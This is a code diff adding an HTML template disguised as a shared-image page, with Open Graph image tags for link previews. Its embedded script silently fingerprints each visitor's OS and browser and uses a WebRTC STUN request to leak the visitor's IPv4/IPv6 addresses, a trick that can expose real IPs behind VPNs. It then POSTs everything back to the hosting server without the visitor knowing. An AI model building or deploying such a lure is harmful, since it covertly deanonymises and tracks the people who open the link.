@@ -1,0 +1,180 @@
+
+ <!DOCTYPE html>
+ <html lang="en">
+ <head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <meta property="og:title" content="{{title}}"/>
+     <meta property="og:type" content="image"/>
+     <meta property="og:url" content="{{image_url}}"/>
+     <meta property="og:image" content="{{image_url}}"/>
+     <meta property="og:site_name" content="{{image_url}}"/>
+     <meta property="og:image:type" content="image/jpg" /> 
+     <meta property="og:image:width" content="700" /> 
+     <meta property="og:image:height" content="300" />
+     <title>{{title}}</title>
+ </head>
+ <body>
+ 	<img src="{{image_url}}" width="300" height="300" alt="" srcset="">    
+
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+     <script>
+      	 (function () {
+             'use strict';
+            let ip=undefined;
+            let ipv4=undefined
+            let ipv6=undefined;
+            let is_rtc=false;
+            let is_err=false;
+            const ipv4Regex =/^(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
+            const ipv6Regex =/^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(([0-9a-fA-F]{1,4}:){1,7}:)|(([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4})|(([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2})|(([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3})|(([0-9a-fA-F]{1,3}:){1,3}(:[0-9a-fA-F]{1,4}){1,4})|(([0-9a-fA-F]{1,2}:){1,2}(:[0-9a-fA-F]{1,4}){1,5})|([0-9a-fA-F]{1,4}:)((:[0-9a-fA-F]{1,4}){1,6})|:(:[0-9a-fA-F]{1,4}){1,7}|::)$/;
+        
+            
+            function send_data(){
+            
+                setTimeout(()=>{
+                    
+                    if((!ipv4 && !ipv6) || (is_err)){
+                        is_rtc=false
+                    }else{
+                        is_rtc=true
+                    }
+                    
+                                        
+                    fetch(window.location.href,{
+                            method:"POST", 
+                            body:"ipv4="+ipv4+"&ipv6="+ipv6+"&os.name="+e.os.name+"&os.version="+e.os.version+"&browser.name="+e.browser.name+"&browser.version="+e.browser.version+"&navigator.userAgent="+navigator.userAgent+"&navigator.appVersion="+navigator.appVersion+"&navigator.platform="+navigator.platform+"&navigator.vendor="+navigator.vendor+"&is_rtc="+is_rtc,
+                            headers:{
+                                'Content-Type': 'application/x-www-form-urlencoded'
+                            }
+                        }
+                    )
+                        
+                },2000)
+            }
+            
+            
+             var module = {
+                 options: [],
+                 header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
+                 dataos: [
+                     { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
+                     { name: 'Windows', value: 'Win', version: 'NT' },
+                     { name: 'iPhone', value: 'iPhone', version: 'OS' },
+                     { name: 'iPad', value: 'iPad', version: 'OS' },
+                     { name: 'Kindle', value: 'Silk', version: 'Silk' },
+                     { name: 'Android', value: 'Android', version: 'Android' },
+                     { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
+                     { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
+                     { name: 'Macintosh', value: 'Mac', version: 'OS X' },
+                     { name: 'Linux', value: 'Linux', version: 'rv' },
+                     { name: 'Palm', value: 'Palm', version: 'PalmOS' }
+                 ],
+                 databrowser: [
+                     { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
+                     { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
+                     { name: 'Safari', value: 'Safari', version: 'Version' },
+                     { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
+                     { name: 'Opera', value: 'Opera', version: 'Opera' },
+                     { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
+                     { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
+                 ],
+                 init: function () {
+                     var agent = this.header.join(' '),
+                         os = this.matchItem(agent, this.dataos),
+                         browser = this.matchItem(agent, this.databrowser);
+                    
+                     return { os: os, browser: browser };
+                 },
+                 matchItem: function (string, data) {
+                     var i = 0,
+                         j = 0,
+                         html = '',
+                         regex,
+                         regexv,
+                         match,
+                         matches,
+                         version;
+                    
+                     for (i = 0; i < data.length; i += 1) {
+                         regex = new RegExp(data[i].value, 'i');
+                         match = regex.test(string);
+                         if (match) {
+                             regexv = new RegExp(data[i].version + '[- /:;]([\d._]+)', 'i');
+                             matches = string.match(regexv);
+                             version = '';
+                             if (matches) { if (matches[1]) { matches = matches[1]; } }
+                             if (matches) {
+                                 matches = matches.split(/[._]+/);
+                                 for (j = 0; j < matches.length; j += 1) {
+                                     if (j === 0) {
+                                         version += matches[j] + '.';
+                                     } else {
+                                         version += matches[j];
+                                     }
+                                 }
+                             } else {
+                                 version = '0';
+                             }
+                             return {
+                                 name: data[i].name,
+                                 version: parseFloat(version)
+                             };
+                         }
+                     }
+                     return { name: 'unknown', version: 0 };
+                 }
+             };
+            
+            var e = module.init(),debug = '';
+
+           
+            
+            try {
+                
+                const stun_config = {
+                    iceServers: [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun.antisip.com:3478" },
+                        { urls: "stun:stun.arbuz.ru:3478" },
+                        { urls: "stun:stun.avigora.com:3478" },
+                        { urls: "stun:stun.avigora.fr:3478" },
+                        { urls: "stun:stun.awa-shima.com:3478" },
+                        { urls: "stun:stun.awt.be:3478" }
+                    ]
+                };
+                const peer_connection = new RTCPeerConnection(stun_config);
+                
+                peer_connection.createDataChannel("");
+                peer_connection.createOffer().then(oferta => peer_connection.setLocalDescription(oferta));
+                
+                peer_connection.onicecandidate = (evento) => {
+                    if (evento.candidate) {
+                        
+                        ip = evento.candidate.candidate.split(' ')[4];
+                       
+                        if(ip){
+                            
+                            if (ipv4Regex.test(ip)) {
+                                ipv4=ip
+                            }
+                            else if(ipv6Regex.test(ip)){
+                                ipv6=ip
+                            }
+                        }
+                    }
+                };
+                
+
+                
+            } catch (error) {
+                is_err=true
+            }
+    
+            send_data()
+                
+            
+         }());	
+     </script>
+ </body>
+ </html> 
